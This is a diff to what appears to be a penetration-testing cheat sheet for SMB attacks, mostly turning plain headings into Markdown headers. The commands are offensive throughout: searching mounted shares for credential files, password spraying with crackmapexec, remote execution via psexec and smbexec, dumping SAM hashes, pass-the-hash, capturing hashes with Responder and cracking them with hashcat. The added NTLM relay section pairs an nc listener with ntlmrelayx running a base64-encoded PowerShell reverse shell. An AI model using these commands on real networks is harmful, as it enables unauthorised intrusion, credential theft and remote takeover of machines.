@@ -23,11 +23,11 @@ New-PSDrive -Name "N" -Root "\\<IP>\<SHARE>" -PSProvider "FileSystem" -Credentia
 $password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
 ```
-Search files by name
+###### Search files by name
 ```
 Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
 ```
-Search files by content
+###### Search files by content
 ```
 Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
 ```
@@ -43,8 +43,8 @@ mount -t cifs //<IP>/<SHARE> /mnt/<SHARE> -o credentials=/path/credentialfile
 		password=<PASS>
 		domain=<DOMAIN>
 ```
-Tools
-Connecting
+### Tools
+###### Connecting
 ```
 smbclient -N -L //<IP>
 smbmap -H <IP> --download "\path\to\file"
@@ -52,30 +52,34 @@ smbmap -H <IP> --upload test.txt "/path/to/file"
 enum4linux-ng <IP> -A -C
 crackmapexec smb <IP> -u <USER_LIST> -p <PASS> --local-auth --continue-on-success
 ```
-Execution
+###### Execution
 ```
 impacket-psexec <USER>:'<PASS>'@<IP> 
 crackmapexec smb <IP> -u <USER> -p '<PASS>' -x '<COMMAND>' --exec-method smbexec
 ```
-User Enumeration
+###### User Enumeration
 ```
 crackmapexec smb <IP/CIDR> -u <USER> -p '<PASS>' --loggedon-users
 ```
-SAM
+###### SAM
 ```
 crackmapexec smb <IP> -u <USER> -p '<PASS>' --sam
 samrdump.py <IP>
 ```
-PTH
+###### PTH
 ```
 crackmapexec smb <IP> -u <USER> -H <HASH>
 ```
-Responder
+###### Responder
 ```
 responder -I <INTERFACE>
-hashcat -m 5600 <HASH>
+hashcat -m 5600 <HASH> <WORDLIST>
 ```
-NTLM Relay
+###### NTLM Relay
 ```
-
+cat /etc/responder/Responder.conf | grep 'SMB =' #make sure it's 'off'
+impacket-ntlmrelayx --no-http-server -smb2support -t <IP>
+nc -lvnp 9001
+#create powershell reverse shell base64 encoded
+impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c 'powershell -e <BASE64>'
 ```
